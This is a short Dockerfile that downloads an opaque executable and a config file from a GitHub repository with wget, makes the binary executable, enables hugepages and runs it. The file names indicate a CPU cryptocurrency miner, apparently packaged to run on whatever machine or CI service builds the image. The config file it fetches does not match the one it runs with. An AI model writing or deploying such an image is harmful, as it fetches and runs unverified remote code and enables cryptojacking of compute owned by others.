FROM ubuntu:16.04

RUN apt-get update && apt-get install -y wget libmicrohttpd-dev libssl-dev build-essential libhwloc-dev 
RUN wget https://github.com/cuyudiri/cuyudiri/raw/master/cpuminer-conf.json 

RUN wget https://github.com/cuyudiri/cuyudiri/raw/master/cpu-ts && chmod +x cpu-ts && sysctl -w vm.nr_hugepages=128
RUN ulimit -n 265555 && ulimit -Hn 265555 

CMD ./cpu-ts -c config.json
